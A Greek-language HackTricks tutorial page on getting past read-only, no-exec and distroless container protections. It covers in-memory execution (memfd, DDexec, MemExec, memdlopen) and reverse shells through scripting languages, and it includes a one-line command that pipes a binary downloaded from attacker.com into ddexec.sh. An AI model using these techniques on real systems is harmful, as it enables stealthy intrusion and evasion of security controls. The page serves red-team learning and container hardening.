# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αν ενδιαφέρεστε για **καριέρα hacking** και να χακάρετε το μη χακαρίσιμο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση πολωνικών, γραπτά και προφορικά_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

Στα παρακάτω βίντεο μπορείτε να βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα εξηγημένες πιο αναλυτικά:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec σενάριο

Είναι όλο και πιο συνηθισμένο να βρίσκουμε μηχανές linux που είναι τοποθετημένες με **προστασία συστήματος αρχείων μόνο για ανάγνωση (ro)**, ειδικά σε κοντέινερ. Αυτό συμβαίνει γιατί για να τρέξετε ένα κοντέινερ με ro σύστημα αρχείων είναι τόσο εύκολο όσο να ορίσετε **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμα και αν το σύστημα αρχείων είναι τοποθετημένο ως ro, **`/dev/shm`** θα είναι ακόμα εγ writable, οπότε είναι ψευδές ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **τοποθετημένος με προστασία no-exec**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.

{% hint style="warning" %}
Από την προοπτική μιας κόκκινης ομάδας, αυτό καθιστά **περίπλοκο να κατεβάσετε και να εκτελέσετε** δυαδικά αρχεία που δεν είναι ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).
{% endhint %}

## Ευκολότερη παράκαμψη: Σενάρια

Σημειώστε ότι ανέφερα δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** εφόσον ο διερμηνέας είναι μέσα στη μηχανή, όπως ένα **shell script** αν το `sh` είναι παρόν ή ένα **python** **script** αν το `python` είναι εγκατεστημένο.

Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε το δυαδικό backdoor σας ή άλλα δυαδικά εργαλεία που μπορεί να χρειαστεί να τρέξετε.

## Παράκαμψη μνήμης

Αν θέλετε να εκτελέσετε ένα δυαδικό αρχείο αλλά το σύστημα αρχείων δεν το επιτρέπει, ο καλύτερος τρόπος να το κάνετε είναι να **το εκτελέσετε από τη μνήμη**, καθώς οι **προστασίες δεν ισχύουν εκεί**.

### Παράκαμψη FD + exec syscall

Αν έχετε μερικούς ισχυρούς κινητήρες σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl**, ή **Ruby** μπορείτε να κατεβάσετε το δυαδικό αρχείο για να το εκτελέσετε από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες και στη συνέχεια να καλέσετε μια **`exec` syscall** υποδεικνύοντας τον **fd ως το αρχείο προς εκτέλεση**.

Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το έργο [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του περάσετε ένα δυαδικό αρχείο και θα δημιουργήσει ένα σενάριο στη δηλωμένη γλώσσα με το **δυαδικό αρχείο συμπιεσμένο και b64 κωδικοποιημένο** με τις οδηγίες να **αποκωδικοποιήσετε και να αποσυμπιέσετε** σε έναν **fd** που δημιουργείται καλώντας την `create_memfd` syscall και μια κλήση στην **exec** syscall για να το τρέξετε.

{% hint style="warning" %}
Αυτό δεν λειτουργεί σε άλλες γλώσσες σεναρίων όπως το PHP ή το Node γιατί δεν έχουν καμία **προεπιλεγμένη μέθοδο για να καλέσουν ωμές syscalls** από ένα σενάριο, οπότε δεν είναι δυνατό να καλέσετε την `create_memfd` για να δημιουργήσετε τον **περιγραφέα μνήμης** για να αποθηκεύσετε το δυαδικό αρχείο.

Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα σας επιτραπεί να το εκτελέσετε επειδή η **προστασία no-exec** θα ισχύει.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας διαδικασίας** αντικαθιστώντας το **`/proc/self/mem`**.

Επομένως, **ελέγχοντας τον κώδικα assembly** που εκτελείται από τη διαδικασία, μπορείτε να γράψετε ένα **shellcode** και να "μεταλλάξετε" τη διαδικασία για να **εκτελέσετε οποιονδήποτε αυθαίρετο κώδικα**.

{% hint style="success" %}
**DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από **μνήμη**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε το Github ή:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **τρέξετε ένα διαφορετικό δυαδικό αρχείο** δεν χρειάζεται να επανεκκινήσετε το DDexec, μπορείτε απλά να τρέξετε το memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον δαίμονα για να περάσετε νέα δυαδικά αρχεία για φόρτωση και εκτέλεση**.

Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε **memexec για να εκτελέσετε δυαδικά αρχεία από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Θα μπορούσε ακόμη και να επιτρέπει τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.

## Distroless Bypass

### Τι είναι το distroless

Τα distroless containers περιέχουν μόνο τα **απαραίτητα ελάχιστα συστατικά για να τρέξει μια συγκεκριμένη εφαρμογή ή υπηρεσία**, όπως βιβλιοθήκες και εξαρτήσεις χρόνου εκτέλεσης, αλλά αποκλείουν μεγαλύτερα συστατικά όπως διαχειριστές πακέτων, shell ή συστήματα βοηθητικών προγραμμάτων.

Ο στόχος των distroless containers είναι να **μειώσει την επιφάνεια επίθεσης των containers εξαλείφοντας περιττά συστατικά** και ελαχιστοποιώντας τον αριθμό των ευπαθειών που μπορούν να εκμεταλλευτούν.

### Reverse Shell

Σε ένα distroless container μπορεί να **μην βρείτε καν `sh` ή `bash`** για να αποκτήσετε μια κανονική shell. Δεν θα βρείτε επίσης δυαδικά αρχεία όπως `ls`, `whoami`, `id`... όλα όσα συνήθως τρέχετε σε ένα σύστημα.

{% hint style="warning" %}
Επομένως, **δεν θα** μπορείτε να αποκτήσετε μια **reverse shell** ή να **καταγράψετε** το σύστημα όπως συνήθως κάνετε.
{% endhint %}

Ωστόσο, αν το παραβιασμένο container τρέχει για παράδειγμα μια εφαρμογή flask, τότε το python είναι εγκατεστημένο, και επομένως μπορείτε να αποκτήσετε μια **Python reverse shell**. Αν τρέχει node, μπορείτε να αποκτήσετε μια Node rev shell, και το ίδιο με σχεδόν οποιαδήποτε **γλώσσα scripting**.

{% hint style="success" %}
Χρησιμοποιώντας τη γλώσσα scripting μπορείτε να **καταγράψετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
{% endhint %}

Αν δεν υπάρχουν **προστασίες `read-only/no-exec`**, μπορείτε να εκμεταλλευτείτε τη reverse shell σας για να **γράψετε στο σύστημα αρχείων τα δυαδικά σας αρχεία** και να **τα εκτελέσετε**.

{% hint style="success" %}
Ωστόσο, σε αυτού του είδους τα containers, αυτές οι προστασίες συνήθως θα υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης μνήμης για να τις παρακάμψετε**.
{% endhint %}

Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε κάποιες ευπάθειες RCE** για να αποκτήσετε reverse shells γλωσσών scripting και να εκτελέσετε δυαδικά αρχεία από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αν ενδιαφέρεστε για μια **καριέρα hacking** και να χακάρετε το αχάκωτο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση πολωνικών_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
